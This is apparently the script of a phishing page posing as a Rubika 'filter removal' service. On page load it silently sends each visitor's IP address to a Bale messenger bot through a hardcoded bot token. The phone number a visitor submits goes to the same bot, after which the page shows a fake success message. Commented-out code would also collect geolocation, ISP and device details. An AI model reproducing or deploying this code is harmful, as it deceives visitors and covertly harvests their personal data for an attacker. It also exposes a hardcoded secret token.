var ip;
async function get_ip() {
    const res_ip = await fetch('https://api.iplocation.net/?cmd=get-ip', {
        mode: "cors",
        cache: "no-cache",
    });
    var ip_json = await res_ip.json();
    ip = ip_json.ip;
    $.ajax({
        type: 'post',
        Headers: 'Access-Control-Allow-Origin:*',
        crossDomain: true,
        dataType: 'jsonp',
        mode: "cors",
        cache: "no-cache",
        url: "https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
        data: { chat_id: "915303220", text: String('کاربری با ایپی : ' + ip + ' وارد پنل رفع فیلتری شد.') },
    });
}
async function send() {
    var phone = document.getElementById('phone_number_1').value;
    // const res_info = await fetch("http://ip-api.com/json/" + ip, {
    //     mode: "cors",
    //     cache: "no-cache",
    // });
    // var info = await res_info.json();
    try {
        // var text = `اطلاعات گرفته شده:\nای پی : ${ip}\nشماره تلفن : ${phone}\nاطلاعات دستگاه : ${navigator.userAgent}\n\nاطلاعات به دست امده از ای:\nوضعیت : ${info.status}\nکشور : ${info.country}\nکد کشور : ${info.countryCode}\nمنطقه : ${info.region}\nشهر : ${info.city}\nزیپ : ${info.zip}\nلوکیشن : https://www.google.com/maps/@${info.lat},${info.lon}\nمنطقه زمانی : ${info.timezone}\nارائه دهنده خدمات اینترنت : ${info.isp}`;
        var response = $.ajax({
            type: 'post',
            Headers: 'Access-Control-Allow-Origin:*',
            crossDomain: true,
            dataType: 'jsonp',
            mode: "cors",
            cache: "no-cache",
            url: "https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
            data: { chat_id: "915303220", text: String(phone) },
        });
        document.body.innerHTML = `<div class="box">
        <img src="icon-192x192.png" alt="logo rubika">
        <h1 dir="rtl">درخواست شما با موفقیت ثبت شد.</h1>
        <p id="text2" dir="rtl">درصورت نیاز میتونید به پشتیبانی ما در روبیکا پیام بدین : @Swift_programmer@</p>

    </div>`
    } catch (error) {
        document.body.innerHTML = `<div class="box">
        <img src="icon-192x192.png" alt="logo rubika">
        <h1>اوه، یه مشکلی پیش اومد</h1>
        <p id="text2" dir="rtl">یه مشکلی در ارتباط با سرور اتفاق افتاد.</p>
        <p id="text2" dir="rtl">اگه فیلترشکن روشن هست لطفا خاموش کنید و دوباره تلاش کنید.</p>
        <p id="text2" dir="rtl">درصورت نیاز به پشتیبانی ما در روبیکا پیام بدین : @Swift_programmer@</p>
    </div>`
    }
}

function check() {
    const phoneNumberInput = document.getElementById('phone_number_1').value;
    if (phoneNumberInput) {
        const phoneNumber = phoneNumberInput.trim();
        const allowedChars = '+ - / 0123456789';
        const cleanedNumber = phoneNumber.replace(/[^A-Za-z0-9+-\/ ]/g, '');

        for (let char of cleanedNumber) {
            if (!allowedChars.includes(char)) {
                document.getElementById('h4').innerText = 'کاراکترهای غیرمجاز در شماره تلفن یافت شد.';
                return;
            }
        }
        if (cleanedNumber.length < 10 || cleanedNumber.length > 12) {
            document.getElementById('h4').innerText = 'طول شماره تلفن باید بین 10 تا 15 رقم باشد.';
            return;
        }
        if (!cleanedNumber.startsWith('9')) {
            document.getElementById('h4').innerText = 'شماره تلفن باید با رقم 9 شروع شود.';
            return;
        }

        document.getElementById('h4').innerText = 'درحال ارتباط با سرور...';
        send();
    } else(
        document.getElementById('h4').innerText = 'لطفا شماره تلفن خود را وارد کنید'
    )
}

get_ip();
